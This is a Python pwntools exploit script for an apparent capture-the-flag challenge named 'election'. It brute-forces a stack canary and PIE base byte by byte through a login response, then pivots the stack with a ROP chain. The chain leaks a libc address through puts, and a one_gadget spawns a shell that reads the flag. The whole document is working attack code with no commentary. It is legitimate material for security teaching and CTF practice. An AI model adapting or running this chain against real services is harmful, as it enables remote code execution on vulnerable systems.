#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

e , l = ELF( '../election/share/election' ) , ELF( './libc-2.27.so' )

y = remote( 'localhost' , 10180 )
#y = remote( 'edu-ctf.csie.org' , 10180 )
#y = process( '../election/share/election' )
#pause()

def login( tok ):
    y.sendafter( '>' , '1' )
    y.sendafter( ':' , tok )

def reg( tok ):
    y.sendafter( '>' , '2' )
    y.sendafter( ':' , tok )

def logout():
    y.sendafter( '>' , '3' )

def vote( idx ):
    y.sendafter( '>' , '1' )
    y.sendafter( ':' , str( idx ) )

def say( idx , data ):
    y.sendafter( '>' , '2' )
    y.sendafter( ':' , str( idx ) )
    y.sendafter( 'Message: ' , data )


reg( 'a' * 0xb8 )

tok = 'a' * 0xb8
canary = '\0'


for i in range( 7 ):
    print i
    for c in map( chr , range( 0xff , -1 , -1 ) ):
        login( tok + canary + c )
        o = y.recvline()
        if 'Invalid token' not in o:
            canary += c
            info( hex( u64( canary.ljust( 8 , '\0' ) ) ) )
            logout()
            break


success( 'cananry -> %s' % hex( u64( canary ) ) )

pie = ''

for i in range( 6 ):
    print i
    for c in map( chr , range( 0xff , -1 , -1 ) ):
        login( tok + canary + pie + c )
        o = y.recvline()
        if 'Invalid token' not in o:
            pie += c
            info( hex( u64( pie.ljust( 8 , '\0' ) ) ) )
            logout()
            break

pie = u64( pie.ljust( 8 , '\0' ) ) - 0x1140
e.address = pie

success( 'pie -> %s' % hex( pie ) )

for i in range( 25 ):
    print i
    reg( 'a' )
    login( 'a' )
    for j in range(10):
        vote( 1 )
    logout()

reg( 'a' )
login( 'a' )
for j in range(5):
    vote( 1 )
logout()


buf = pie + 0x202160

leave_ret = pie + 0xbe9
pop_rdi = pie + 0x11a3

csu = pie + 0x1180
ppppppr = pie + 0x119a # pop rbx; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

p = flat(
    0,
    pop_rdi,
    e.got.__libc_start_main,
    e.plt.puts,
    ppppppr,
    0, 1, buf + 0xa0, 0, buf + 0xa0 - 8, 0x100,
    csu,
    0, 0, 0, 0, 0, 0, 0,
    0x7777777,
    e.plt.read
)
login( p )

login( 'a' )

p = flat(
    'a' * 0xe8,
    canary,
    buf,
    leave_ret
)
say( 1 , p[:-1] )

logout()
y.recvline()
l.address = u64( y.recv(6) + '\0\0' ) - l.sym.__libc_start_main
success( 'libc -> %s' % hex( l.address ) )

one = 0x10a38c
y.send( p64( l.address + one ) )

sleep( 0.3 )
y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()


